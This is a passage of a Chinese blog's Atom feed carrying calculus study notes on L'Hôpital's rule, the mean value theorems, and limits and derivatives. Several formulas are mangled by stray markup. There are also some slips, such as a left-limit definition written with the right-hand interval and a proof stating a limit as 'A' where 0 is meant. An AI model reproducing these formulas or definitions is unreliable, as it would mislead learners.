    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>洛必达法则</title>
    <link href="https://www.ascotbe.com/2023/02/16/FurtherMathematics_0x04/"/>
    <id>https://www.ascotbe.com/2023/02/16/FurtherMathematics_0x04/</id>
    <published>2023-02-16T15:58:53.000Z</published>
    <updated>2023-02-25T09:40:43.376Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_4.gif" style="zoom:25%;" /></p><h2 id="洛必达法则"><a href="#洛必达法则" class="headerlink" title="洛必达法则"></a>洛必达法则</h2><p>对于分式$\frac{f(x)}{g(x)}$，如果在自变量的某一变化过程中，分子分母的极限均为零或者均为无穷大，这时该分式的极限可能存在，也可能不存在，通常称这种分式的极限为未定式，分别记为$\frac{0}{0}$和$\frac{\infty}{\infty}$</p><p>洛必达法则：在自变量$x$的某一个变化过程中$x \to a , x \to a^+ , x \to a^- , x \to \infty , x \to -\infty , x \to + \infty$，设$f(x),g(x)$ 满足下列条件：</p><ul><li>函数$f(x),g(x)$的极限均为0或者$\infty$</li><li>$f(x),g(x)$均可导，既${f}’(x),{g}’(x)$ 存在，且${g}’(x) \ne 0$</li><li>$\lim \frac{f’(x)}{g’(x)}$存在或者为$\infty$</li></ul><p>则$\lim  \frac{f(x)}{g(x)}=\lim \frac{f’(x)}{g’(x)}$</p><div class="note success modern"><p>做题思路：判断类型然后求导到不再是$\frac{0}{0}$ 和$\frac{\infty}{\infty}$ 后把值带进去</p></div><p>例题1：</p><p>$\begin{align} \lim <em>{x \rightarrow 1} \frac{x^{3}-3 x+2}{x^{3}-x^{2}-x+1} &amp; = \lim </em>{x \rightarrow 1} \frac{3 x^{2}-3}{3 x^{2}-2 x-1} \ &amp; = \lim _{x \rightarrow 1} \frac{6 x}{6 x-2} \ &amp; = \frac{3}{2} \end{align}$</p><p>$\lim _{x \rightarrow 1} \frac{6 x}{6 x-2}$不再是$\frac{0}{0}$型不可在求导，所以代入值计算</p><p>例题2：</p><p>$\begin{align} \lim <em>{x \rightarrow 0} \frac{x-\sin x}{x^{3}} &amp; = \lim </em>{x \rightarrow 0} \frac{1-\cos x}{3 x^{2}} \ &amp;= \lim _{x \rightarrow 0} \frac{\sin x}{6 x} \ &amp;= \frac{1}{6} \end{align}$</p><p>其他未定式：$0 \cdot \infty , \infty-\infty , 0^0 , 1^\infty , \infty^0$型</p><p>先变形转化为$\frac{0}{0}$或者$\frac{\infty}{\infty}$型，在考虑使用洛必达法则</p><ul><li>$0 \cdot \infty=\frac{0}{\frac{1}{\infty} }=\frac{\infty}{\frac{1}{0} }$</li><li>$\infty-\infty$：先”合二为一”，在观察类型</li><li>$0^0$，$1^\infty$，$\infty^0$：幂指数函数类型的未定式，有$f(x)^{g(x)}=e^{g(x)\ln(f(x))}$，指数部分$g(x)\ln(f(x))$为$0 \cdot \infty$型</li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>微分中值定理</title>
    <link href="https://www.ascotbe.com/2023/02/14/FurtherMathematics_0x03/"/>
    <id>https://www.ascotbe.com/2023/02/14/FurtherMathematics_0x03/</id>
    <published>2023-02-14T15:58:53.000Z</published>
    <updated>2023-02-14T09:24:11.455Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_3.jpg" alt="4fb0178999b6ebe321bfc218a277fb7c" style="zoom:20%;" /></p><h2 id="微积分中的基础概念"><a href="#微积分中的基础概念" class="headerlink" title="微积分中的基础概念"></a>微积分中的基础概念</h2><h3 id="罗尔中值定理"><a href="#罗尔中值定理" class="headerlink" title="罗尔中值定理"></a>罗尔中值定理</h3><h4 id="前导"><a href="#前导" class="headerlink" title="前导"></a>前导</h4><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/13.gif" alt=""></p><p>可以认为他从$A$点出发，经过一段时间又回到了$A$点，画成$s-t$（位移-时间）图就是：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/14.jpg" alt="2"></p><p>根据常识，因为要回到起点，中间必定有速度为0的点，这就是罗尔中值定理</p><h4 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h4><p>设函数满足以下三个条件：</p><ul><li>$f(x)$在闭区间$[a,b]$上连续</li><li>$f(x)$在开区间$(a,b)$上可导</li><li>$f(a)=f(b)$</li></ul><p>则存在$\xi \in (a,b)$，使得${f}’(\xi)=0$。</p><p>$f(x)$在闭区间$[a,b]$上连续是必须的，否则可能没有${f}’(\xi)=0$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/15.png" alt="3"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/16.png" alt="4"></p><h3 id="拉格朗日中值定理"><a href="#拉格朗日中值定理" class="headerlink" title="拉格朗日中值定理"></a>拉格朗日中值定理</h3><h4 id="前导-1"><a href="#前导-1" class="headerlink" title="前导"></a>前导</h4><p>通过交通管理中的区间测速：位移➗时间＝平均速度。这样的话可以通过计算你走了一段固定距离的时间来计算你是否超速</p><p>时间$a$采集到汽车的位移为$f(a)$，时间$b$采集到汽车的位移为$f(b)$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/17.png" alt="4"></p><p>可以据此算出平均速度为：</p><p>$\begin{align}<br>\frac{f(b)-f(a)}{b-a}<br>\end{align}$</p><p>比如算出来平均速度为$70km/h$，平均速度是由瞬时速度叠加的结果，那么路程中的瞬时速度可能为：</p><ul><li>匀速前进：那么整个路程的瞬时速度必然全为$70km/h$</li><li>变速前进：整个路程的瞬时速度必然有大于、等于、小于$70km/h$的情况</li></ul><p>下面是变速前进的速度变换动画（蓝色为大于，闪烁为平行即等于，绿色为小于）：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/18.gif" alt="img"></p><p>如果限速$60km/h$，那么根据汽车的平均速度为$70km/h$，就可以判定路程中必然至少有一个点超速。</p><h4 id="定理-1"><a href="#定理-1" class="headerlink" title="定理"></a>定理</h4><p>设函数满足以下两个条件：</p><ul><li>$f(x)$在闭区间$[a,b]$上连续</li><li>$f(x)$在开区间$(a,b)$上可导</li></ul><p>则存在$\xi \in (a,b)$，使得${f}’(\xi)=\frac{f(b)-f(a)}{b-a}<br>$</p><p>这个定理的几何意义就是，至少存在一点的切线与端点的连线平行；物理意义是，至少存在一点的速度与平均速度相等：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/19.png" alt="img"></p><p>把它旋转一下，使得$f(a)=f(b)$，得到的就是罗尔中值定理，可见罗尔是拉格朗日的特例</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/20.gif" alt="8"></p><h3 id="柯西中值定理"><a href="#柯西中值定理" class="headerlink" title="柯西中值定理"></a>柯西中值定理</h3><h4 id="前导-2"><a href="#前导-2" class="headerlink" title="前导"></a>前导</h4><p>之前讨论的是一维空间中的运动，下面来看看二维空间中的运动（关于这点，可以参看课程中“参数方程求导与相关变化率”这一节）。假设参数方程：</p><p>$\begin{align}<br>\left{\begin{array}{l}<br>x = g(t) \<br>y = f(t)<br>\end{array}\right.<br>\end{align}$</p><p>描述了一个二维空间中的运动：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/21.gif" alt="9"></p><p>为了方便描述，令$A=(g(a), f(a))$、$B=(g(b), f(b))$，那么上图描述的就是$a$时刻在$A$位置，$b$时刻运动到了$B$位置。向量$a$就表明了最终的运动方向。仔细分析此运动过程，刚开始的时候，速度$v$的方向与$a$相反，也就是说点是反着走的：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/22.gif" alt="10"></p><p>所以需要不断转弯调整</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/23.gif" alt="11"></p><p>最终才能到达目的地：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/24.gif" alt="12"></p><p>容易想象，在转弯调整的过程中，必然会有$v$和$a$同向的时刻，比如$t=\xi$时刻：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/25.png" alt="13"></p><p>此时，$a$所在直线的斜率：</p><p>$\begin{align}\frac{f(b)-f(a)}{g(b)-g(a)}\end{align}$</p><p>以及$v$所在直线的斜率（根据参数方程的求导法则）：</p><p>$\begin{align}\frac{f^{\prime}(\xi)}{g^{\prime}(\xi)}\end{align}$</p><p>必然相等：</p><p>$\begin{align}\frac{f(b)-f(a)}{g(b)-g(a)}=\frac{f^{\prime}(\xi)}{g^{\prime}(\xi)}\end{align}$</p><p>这就是柯西中值定理。</p><h4 id="定理-2"><a href="#定理-2" class="headerlink" title="定理"></a>定理</h4><p>设函数$f(x),g(x)$满足以下条件：</p><ul><li>$f(x),g(x)$在闭区间$[a,b]$上连续</li><li>$f(x),g(x)$在开区间$(a,b)$上可导</li><li>$\forall x \in (a,b)$，有：${g}’(x) \ne 0$。</li></ul><p>则存在$\xi \in (a,b)$，使等式$\frac{f(b)-f(a)}{g(b)-g(a)}=\frac{f^{\prime}(\xi)}{g^{\prime}(\xi)}$成立</p><p>可以把$f(x),g(x)$组合成参数方程</p><p>$\begin{align}<br>\left{\begin{array}{l}<br>x = g(t) \<br>y = f(t)<br>\end{array}\right.<br>\end{align}$</p><p>这样柯西中值定理就有类似于拉格朗日中值定理一样的几何意义：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/26.gif" alt="14"></p><p>如果：</p><p>$\begin{align}<br>\left{\begin{array}{l}<br>x = x \<br>y = f(x)<br>\end{array}\right.<br>\end{align}$</p><p>那么柯西中值定理就变为了拉格朗日中值定理，所以拉格朗日又是柯西的特例。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>三大微分中值定理的联系与区别：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/27.gif" alt="15"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>极限、导数、微分</title>
    <link href="https://www.ascotbe.com/2023/02/07/FurtherMathematics_0x02/"/>
    <id>https://www.ascotbe.com/2023/02/07/FurtherMathematics_0x02/</id>
    <published>2023-02-07T15:58:53.000Z</published>
    <updated>2023-08-03T05:55:52.495Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_2.gif" alt="0_1"></p><h2 id="极限"><a href="#极限" class="headerlink" title="极限"></a>极限</h2><div class="note success modern"><p><strong>微商</strong>（即<strong>导数</strong>）是一种极限。<strong>定积分</strong>也是一种极限。</p></div><p>关于这一节推荐观看下面视频，讲的是非常的好</p><iframe src="//player.bilibili.com/player.html?aid=901821185&bvid=BV1SP4y1U7E5&cid=869271574&page=1&autoplay=0" width="780" height="480" scrolling="true" border="0" frameborder="no" framespacing="0" allowfullscreen="true" > </iframe><h3 id="符号解释"><a href="#符号解释" class="headerlink" title="符号解释"></a>符号解释</h3><p>$\varepsilon$和$\delta$都表示一个非常小的数，意义是一样的，只是为了让看起来显示不一样</p><p>$\forall$取任意一个值</p><h3 id="直观介绍"><a href="#直观介绍" class="headerlink" title="直观介绍"></a>直观介绍</h3><p>《庄子》曰：“一尺之捶，日取其半，万世不竭。”假设有一尺长的线段，每天划去一半，那么它的长度会变得如何呢？如果我们查看特定的某一天，比如说第7天，那么线段的长度还剩$\frac{1}{128}$尺。但我们想知道的是，线段的长度“最终”会怎么样？用数学的语言来说，就是以下的数列：</p><p>$\begin{align}<br>a<em>{0} = 1, \quad a</em>{1} = \frac{1}{2}, \quad a<em>{2} = \frac{1}{4}, \cdots, a</em>{n} = \frac{1}{2^{n}}, \cdots<br>\end{align}$</p><p>在$n$”非常大”的时候会有什么性质？为此我们可以建立以下的表格看看$n$”非常大”的时候，$a_n$会是什么样子：</p><div class="table-container"><table><thead><tr><th>$n$</th><th>1</th><th>5</th><th>20</th><th>100</th><th>500</th><th>10000</th></tr></thead><tbody><tr><td>$a_n$</td><td>0.5</td><td>0.03125</td><td>$9.54 \times  10^{-7}$</td><td>$1.27 \times  10^{-30}$</td><td>$3.27 \times  10^{-150}$</td><td>$2 \times  10^{-3010}$</td></tr></tbody></table></div><p>可以看出，$n$越大，$a_n$就越接近0；当$n$很大，比如说$n=10000$的时候，$a_n$与0的差别只有$2 \times  10^{-3010}$了。这时候，我们就称：数列$a_n$的极限是0，并记作：</p><p>$\begin{align}<br>\lim <em>{n \rightarrow \infty} a</em>{n} &amp; = 0<br>\end{align}$</p><blockquote><p>它表示只要$n$足够大，$a_n$就会足够接近0”这样一个性质。</p></blockquote><p>另一个例子：设函数$f$为$f(x)=x^2$，我们来关注它在2附近的取值情况。下表显示出当自变量$x$靠近2的时候，$f(x)$的值有何特性：</p><div class="table-container"><table><thead><tr><th>$x$</th><th>1.7</th><th>1.8</th><th>1.9</th><th>1.95</th><th>1.99</th><th>1.999</th></tr></thead><tbody><tr><td>$f(x)=x^2$</td><td>2.89</td><td>3.24</td><td>3.61</td><td>3.8025</td><td>3.9601</td><td>3.996001</td></tr></tbody></table></div><p>表中取的$x$值都是小于2的。也可以取大于2的$x$值，见下表：</p><div class="table-container"><table><thead><tr><th>$x$</th><th>2.3</th><th>2.2</th><th>2.1</th><th>2.05</th><th>2.01</th><th>2.001</th></tr></thead><tbody><tr><td>$f(x)=x^2$</td><td>5.29</td><td>4.84</td><td>4.41</td><td>4.2025</td><td>4.0401</td><td>4.004001</td></tr></tbody></table></div><p>从以上两个表格中，可以看出，当$x$越来越靠近2的时候，不论是比2大还是比2小，$f(x)$的值都会越来越靠近4。我们把这个性质称为：函数$f(x)$当$x$趋于2的时候的极限是4，并记作：</p><p>$\begin{align}<br>\lim _{x \rightarrow 2} x^2 &amp; = 4<br>\end{align}$</p><blockquote><p>极限可以用来描述某个变化的趋势，但不是所有的趋势都可以用极限描述。</p></blockquote><p>设函数$g$为$g(x)=\sin(\frac{1}{x-2})$，当自变量$x$靠近2的时候，$g(x)$的值变化如下表：</p><div class="table-container"><table><thead><tr><th>$x$</th><th>1.7</th><th>1.8</th><th>1.9</th><th>1.95</th><th>1.99</th><th>1.999</th></tr></thead><tbody><tr><td>$g(x)=\sin(\frac{1}{x-2})$</td><td>0.191</td><td>0.959</td><td>0.544</td><td>-0.913</td><td>0.506</td><td>-0.827</td></tr></tbody></table></div><p>大于2的$x$的值靠近2时</p><div class="table-container"><table><thead><tr><th>$x$</th><th>2.3</th><th>2.2</th><th>2.1</th><th>2.05</th><th>2.01</th><th>2.0014</th></tr></thead><tbody><tr><td>$g(x)=\sin(\frac{1}{x-2})$</td><td>-0.191</td><td>-0.959</td><td>-0.544</td><td>0.913</td><td>-0.506</td><td>0.827</td></tr></tbody></table></div><p>$x$的值靠近2时，$g(x)$的值并不接近任何一个特定的数值。这时候，我们称函数在$g(x)$在$x$趋于2时没有极限。</p><h3 id="数列的极限"><a href="#数列的极限" class="headerlink" title="数列的极限"></a>数列的极限</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>设${x<em>{n}}</em>{n=1}^{\infty }$是一个给定的实数数列。$A$是一个给定的实数。如果对任意的正实数${\displaystyle \varepsilon }$，都存在一个自然数$N$，使得对任意的自然数$n$，只要$n\geqslant N$，就有${\displaystyle \vert x<em>{n}-A\vert &lt;\varepsilon}$那么就称$A$是数列${x</em>{n}}<em>{n=1}^{\infty }$的极限，记为$\lim </em>{n \rightarrow \infty }x<em>{n}=A$。反之则称$A$不是数列${x</em>{n}}_{n=1}^{\infty }$的极限。</p><p>数列极限的表示方法是：</p><p>$\begin{align}\lim <em>{n \rightarrow \infty} x</em>{n}=A \end{align}$</p><p>$\forall \varepsilon&gt;0$,存在正整数 $N$,当$n \geqslant N$时,就有$\left|x_{n}-A\right|&lt;\varepsilon$。</p><h3 id="函数的极限"><a href="#函数的极限" class="headerlink" title="函数的极限"></a>函数的极限</h3><h4 id="自变量趋于有限值时函数的极限"><a href="#自变量趋于有限值时函数的极限" class="headerlink" title="自变量趋于有限值时函数的极限"></a>自变量趋于有限值时函数的极限</h4><p>函数不考虑$x=x_0$的情况，所以是一个取心领域</p><p>$\begin{align}\lim <em>{x \rightarrow x</em>{0}} f(x)=A\end{align}$</p><p>$\forall \varepsilon&gt;0$,存在正数$\delta$,当$0&lt;\left|x-x_{0}\right|&lt;\delta$时,就有$|f(x)-A|&lt;\varepsilon$。</p><p>证明：$\lim_{x \to 1 }(2x-1) = 1$</p><blockquote><p>根据定义我们需要找出$\delta$。首先我们给定$\forall \varepsilon$都会有$|f(x)-A|&lt;\varepsilon$，把极限代入进去$|(2x-1)-1|=|2x-2|=2|x-1|&lt; \varepsilon$，所以$|x-1|&lt;\frac{\varepsilon}{2}$，这样我们就找到了$\delta$的值为$\frac{\varepsilon}{2}$。接下来我们可以写证明了</p></blockquote><p>给定任意一个$\varepsilon$，取$\delta=\frac{\varepsilon}{2}$，当$0&lt;|x-1|&lt;\delta$</p><p>$\begin{align} |f(x)-A| &amp;=|(2x-1)-1| =|2x-2|\ &amp;=2|x-1|&lt; 2 \cdot  \delta\&amp;=2 \cdot \frac{\varepsilon}{2}\&amp;=\varepsilon \&amp; \therefore \lim_{x \to 1 }(2x-1)  = 1 \end{align}$</p><p>证明：$\lim_{x \to 1 }\frac{x^2-1}{x-1} = 2$</p><blockquote><p>根据定义我们需要找出$\delta$。首先我们给定$\forall \varepsilon$都会有$|f(x)-A|&lt;\varepsilon$，把极限代入进去$|\frac{x^2-1}{x-1}-2|=|\frac{(x+1)(x-1)}{x-1}-2|=|x-1|&lt; \varepsilon$，所以$|x-1|&lt;\varepsilon$，这样我们就找到了$\delta$的值为$\varepsilon$。接下来我们可以写证明了</p></blockquote><p>给定任意一个$\varepsilon$，取$\delta=\varepsilon$，当$0&lt;|x-1|&lt;\delta$</p><p>$\begin{align} |f(x)-A| &amp; =|\frac{x^2-1}{x-1}-2| \ &amp;=|x-1|&lt; \delta\&amp;=\varepsilon \&amp; \therefore \lim_{x \to 1 }\frac{x^2-1}{x-1} = 2 \end{align}$</p><h4 id="自变量趋于无穷大时函数的极限"><a href="#自变量趋于无穷大时函数的极限" class="headerlink" title="自变量趋于无穷大时函数的极限"></a>自变量趋于无穷大时函数的极限</h4><p>$\begin{align}<br>\lim_{x \to \infty }f(x) &amp; = A<br>\end{align}$</p><p>$\forall \varepsilon$ 存在正数$X$，当$|x|&gt;X$时，就有$|f(x)-A|&lt;\varepsilon$</p><p>证明：$\lim_{x \to \infty }\frac{1}{x} = A$</p><blockquote><p>根据定义我们需要找出$X$。首先我们给定$\forall \varepsilon$都会有$|f(x)-A|$，把极限代入进去$|\frac{1}{x}-0|=|\frac{1}{x}|&lt;\varepsilon$，所以$|x|&gt;\frac{1}{\varepsilon}$，这样我们就找到$X$是为$\frac{1}{\varepsilon}$。接下来我们可以写证明了</p></blockquote><p>给定任意一个$\varepsilon$，取$X=\frac{1}{\varepsilon}$，当$|x|&gt;X$</p><p>$\begin{align} |f(x)-A| &amp;=|\frac{1}{x}-0|\&amp;=|\frac{1}{x}|&lt;\varepsilon \ &amp;\therefore \lim_{x \to \infty }f(x)  = A \end{align}$</p><h4 id="左右极限"><a href="#左右极限" class="headerlink" title="左右极限"></a>左右极限</h4><p>从左边接近于$x_0$就表示为左极限，从右边接近$x_0$就表示右极限</p><p>$\begin{align}<br>\lim_{x \to x^-_0}f(x) &amp; = A<br>\end{align}$</p><p>左极限：$\forall \varepsilon$ 存在正数$\delta$，当$x_0 &lt; x &lt;x_0 + \delta$时，就有$|f(x)-A|&lt;\varepsilon$</p><p>$\begin{align}<br>\lim_{x \to x^+_0}f(x) = A<br>\end{align}$</p><p>如果函数要有极限那么它的充分必要条件是同时有左极限和右极限，并且左右极限相等</p><p>$\begin{align}<br>\lim<em>{x \to x_0}f(x) = A \Leftrightarrow \lim</em>{x \to x^-<em>0}f(x) = \lim</em>{x \to x^+_0}f(x)=A<br>\end{align}$</p><h3 id="极限的分支"><a href="#极限的分支" class="headerlink" title="极限的分支"></a>极限的分支</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/94.png" alt="image-20230803103313295"></p><h2 id="导数"><a href="#导数" class="headerlink" title="导数"></a>导数</h2><p>如果函数$y=f(x)$在开区间内每一点都可导，就称函数$y=f(x)$在区间内可导。这时函数$y=f(x)$对于区间内的每一个确定的$x$值，都对应着一个确定的导数值，这就构成一个新的函数，称这个函数为原来函数$y=f(x)$的导函数，记作$y^{\prime}$、$f^{\prime}(x)$、$\frac{\mathrm{~d} y}{\mathrm{~d} x}$或$\frac{\mathrm{~d} f(x)}{\mathrm{~d} x}$，简称导数</p><p>$\begin{align}<br>f^{\prime}(x) &amp; = \lim _{\Delta x \rightarrow 0} \frac{f(x+\Delta x)-f(x)}{\Delta x}<br>\end{align}$</p><h3 id="导数的几何意义"><a href="#导数的几何意义" class="headerlink" title="导数的几何意义"></a>导数的几何意义</h3><div class="note success modern"><p>导数的几何意义是该函数曲线在这一点上的切线斜率。</p></div><p>当函数定义域和取值都在实数域中的时候，导数可以表示函数的曲线上的切线斜率。如右图所示，设$P<em>{0}$为曲线上的一个定点，$P$为曲线上的一个动点。当$P$沿曲线逐渐趋向于点$P</em>{0}$时，并且割线$PP<em>{0}$的极限位置$P</em>{0}T$存在，则称$P<em>{0}T$为曲线在$P</em>{0}$处的切线。</p><p>若曲线为一函数$y=f(x)$的图像，那么割线$PP_{0}$（粉红色）的斜率为:</p><p>$\begin{align}\tan\varphi=\frac{\Delta y}{\Delta x}=\frac{f\left(x<em>{0}+\Delta x\right)-f\left(x</em>{0}\right)}{\Delta x}\end{align}$</p><p>当$P<em>{0}$处的切线$P</em>{0}T$（熵红色），即$PP<em>{0}$的极限位置存在时，此时$\Delta x\rightarrow0,\varphi\rightarrow\alpha$，则$P</em>{0}T$的斜率$\tan\alpha$为:</p><p>$\begin{align}\tan\alpha=\lim<em>{\Delta x\rightarrow0}\tan\varphi=\lim</em>{\Delta x\rightarrow0}\frac{f\left(x<em>{0}+\Delta x\right)-f\left(x</em>{0}\right)}{\Delta x}\end{align}$</p><p>上式与一般定义中的导数定义完全相同,也就是说$f^{\prime}\left(x<em>{0}\right)=\tan\alpha$，因此,导数的几何意义即曲线$y=f(x)$在点$P</em>{0}\left(x<em>{0},f\left(x</em>{0}\right)\right)$处切线的斜率。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/90.svg" alt="Derivative_-_geometric_meaning"></p><p>动图的话可以参考下面</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/95.gif" alt="95"></p><h3 id="导数的链式法则"><a href="#导数的链式法则" class="headerlink" title="导数的链式法则"></a>导数的链式法则</h3><p><strong>加法的求导</strong>：可以理解为<strong>变化量（率）的叠加</strong>，即${f}’+{g}’$</p><p><strong>乘法的求导</strong>：可以理解为<strong>矩形面积的变化率</strong>，将$f(x)$和$g(x)$看成矩形的边长，导数为$\frac{(f + \mathrm{~d} f)(g+\mathrm{~d} g)}{\mathrm{~d} x}$，在$\mathrm{d} x$趋近于0时，面积增量为趋近于0时</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/96.png" alt=""></p><p><strong>复合函数的求导</strong>：可以理解为<strong>变化率的传递</strong>。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/97.png" alt="Chain Rule"></p><h3 id="求导法则"><a href="#求导法则" class="headerlink" title="求导法则"></a>求导法则</h3><h4 id="简单函数"><a href="#简单函数" class="headerlink" title="简单函数"></a>简单函数</h4><p>这里将列举14个基本初等函数的导数。</p><div class="table-container"><table><thead><tr><th><strong>函数</strong></th><th><strong>原函数</strong></th><th><strong>导函数</strong></th></tr></thead><tbody><tr><td>常函数</td><td>$y  = C$</td><td>$y^{\prime}  = 0$</td></tr><tr><td>指数函数</td><td>$y  = a^{x}$</td><td>$y^{\prime}  = a^{x} \ln a$</td></tr><tr><td>指数函数</td><td>$y  = e^{x}$</td><td>$y^{\prime}  = e^{x}$</td></tr><tr><td>幂函数</td><td>$y  = x^{n}$</td><td>$y^{\prime}  = n x^{n-1}$</td></tr><tr><td>对数函数</td><td>$y  = \log _{a} x$</td><td>$y^{\prime}  = \frac{1}{x \ln a}$</td></tr><tr><td>对数函数</td><td>$y  = \ln x$</td><td>$y^{\prime}  = \frac{1}{x}$</td></tr><tr><td>正弦函数</td><td>$y  = \sin x$</td><td>$y^{\prime}  = \cos x$</td></tr><tr><td>余弦函数</td><td>$y  = \cos x$</td><td>$y^{\prime}  = -\sin x$</td></tr><tr><td>正切函数</td><td>$y  = \tan x$</td><td>$y^{\prime}  = \sec ^{2} x$</td></tr><tr><td>余切函数</td><td>$y  = \cot x$</td><td>$y^{\prime}  = -\csc ^{2} x$</td></tr><tr><td>正割函数</td><td>$y  = \sec x$</td><td>$y^{\prime}  = \sec x \tan x$</td></tr><tr><td>余割函数</td><td>$y  = \csc x$</td><td>$y^{\prime}  = -\csc x \cot x$</td></tr><tr><td>反正弦函数</td><td>$y  = \arcsin x$</td><td>$y^{\prime}  = \frac{1}{\sqrt{1-x^{2}}}$</td></tr><tr><td>反余弦函数</td><td>$y  = \arccos x$</td><td>$y^{\prime}  = -\frac{1}{\sqrt{1-x^{2}}}$</td></tr><tr><td>反正切函数</td><td>$y  = \arctan x$</td><td>$y^{\prime}  = \frac{1}{1+x^{2}}$</td></tr><tr><td>反余切函数</td><td>$y  = \operatorname{arccot} x$</td><td>$y^{\prime}  = -\frac{1}{1+x^{2}}$</td></tr><tr><td>双曲线函数</td><td>$y  = \operatorname{sh} x$</td><td>$y^{\prime}  = \operatorname{ch} x$</td></tr></tbody></table></div><h4 id="函数的和、差、积、商的求导法则"><a href="#函数的和、差、积、商的求导法则" class="headerlink" title="函数的和、差、积、商的求导法则"></a>函数的和、差、积、商的求导法则</h4><p>和差</p><p>$\begin{align}(u \pm v)^{\prime}=u^{\prime} \pm v^{\prime}\end{align}$</p><p>积</p><p>$\begin{align}(u v)^{\prime}=u^{\prime} v+u v^{\prime} \end{align}$</p><p>商</p><p>$\begin{align}\left(\frac{u}{v}\right)^{\prime}=\frac{u^{\prime} v-u v^{\prime}}{v^{2}}<br>\end{align}$</p><h4 id="原函数与反函数导数关系"><a href="#原函数与反函数导数关系" class="headerlink" title="原函数与反函数导数关系"></a>原函数与反函数导数关系</h4><p>反函数的导数就是原函数导数的倒数</p><p>$\begin{align}<br>\left[f^{-1}(x)\right]^{\prime} &amp; = \frac{1}{f^{\prime}(y)} =\frac{\mathrm{~d} y}{\mathrm{~d} x}=\frac{1}{\frac{\mathrm{~d} x}{\mathrm{~d} y}}<br>\end{align}$</p><h4 id="复合函数"><a href="#复合函数" class="headerlink" title="复合函数"></a>复合函数</h4><p>如果$u=g(x)$在点$x$可导,而$y=f(u)$在点$u=g(x)$可导，那么复合函数$y=f[g(x)]$在点$x$可导,且其导数为</p><p>$\begin{align}\frac{\mathrm{~d} y}{\mathrm{~d} x} &amp; = f^{\prime}(u) \cdot g^{\prime}(x)  = \frac{\mathrm{~d} y}{\mathrm{~d} u} \cdot \frac{\mathrm{~d} u}{\mathrm{~d} x} \end{align}$</p><h3 id="二阶导数"><a href="#二阶导数" class="headerlink" title="二阶导数"></a>二阶导数</h3><p>如果函数的导数${\displaystyle f’(x)}$在${\displaystyle x}$处可导，则称${\displaystyle (f’(x))’}$为${\displaystyle x}$的<strong>二阶导数</strong>。记做${\displaystyle f’’(x)}$，${\displaystyle y’’}$，${\displaystyle {\frac { { \text{d } }^{ 2 } y } { {\text{d} }x^{2} } } }$ 或${\displaystyle {\frac { {\text{d} }^{2}f(x)}{ {\text{d} }x^{2} } } }$。如果函数的二阶导数存在，我们就说这个函数在点${\displaystyle x}$处二阶可导。</p><h3 id="高阶导数"><a href="#高阶导数" class="headerlink" title="高阶导数"></a>高阶导数</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>在数学中，我们是通过${\displaystyle f(x)}$ 的${\displaystyle n-1}$阶导数（${\displaystyle n&gt;1}$ ）定义${\displaystyle n}$ 阶导数的。如果函数的${\displaystyle n-1}$ 阶导数在${\displaystyle x}$处可导，则称${\displaystyle f(x)}{\displaystyle n-1}$阶导数的导数为${\displaystyle f(x)}$ 的n阶导数。记做${\displaystyle f^{(n)}(x)}$，${\displaystyle {\frac { {\text{d} }^{n}y}{ {\text{d} }x^{n} } } }$ 或${\displaystyle {\frac { {\text{d} }^{n}f(x) } { {\text{d} }x^{n } } } }$。如果函数的${\displaystyle n}$阶导数存在，我们就说这个函数在点${\displaystyle x}$ 处${\displaystyle n}$阶可导。</p><h4 id="直接求导"><a 